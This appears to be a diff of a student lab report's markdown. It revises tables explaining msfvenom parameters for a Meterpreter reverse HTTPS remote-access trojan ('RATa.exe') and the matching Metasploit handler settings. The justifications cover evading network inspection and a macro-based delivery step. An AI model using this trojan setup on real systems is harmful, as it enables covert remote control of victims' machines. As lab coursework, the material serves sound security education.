@@ -47,18 +47,18 @@ python3 -m http.server 8080
 
 | Parameter | Value | Justification |
 |:---|:---|:---|
-| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches target Windows 10 VM; HTTPS encapsulates C2 traffic in TLS to evade network inspection |
-| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will phone home to; must match the listener exactly |
-| `LPORT=14000` | Port | High port above 12000 as required; avoids well-known port scrutiny while satisfying lab constraints |
-| `-f exe` | Output format | Produces a standalone Windows executable suitable for direct execution |
-| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb across the two delivery vectors |
+| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches targets architecture and HTTPS encapsulates C2 traffic in TLS to evade network inspection |
+| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will connect to |
+| `LPORT=14000` | Port | High port that avoids the same security checks that lower or more well-known ports will have |
+| `-f exe` | Output format | Produces a Windows executable for direct execution |
+| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb, also note this must match file retrieved in macro code |
 
 | Parameter | Value | Justification |
 |:---|:---|:---|
 | `exploit/multi/handler` | Module | Generic listener compatible with any msfvenom-generated payload |
 | `set payload windows/x64/meterpreter/reverse_https` | Payload | Must mirror the payload used during generation exactly or the connection will be rejected |
-| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST baked into the RAT at generation time |
-| `set LPORT 14000` | Port | Must match the LPORT baked into the RAT at generation time |
+| `set LHOST 192.168.92.136` | Kali IP | Must match the LHOST used during RAT generation |
+| `set LPORT 14000` | Port | Must match the LPORT used during RAT generation |
 | `exploit -j` | Run as job | Allows the console to remain interactive while waiting for incoming connections |
 
 **Macro Creation:**
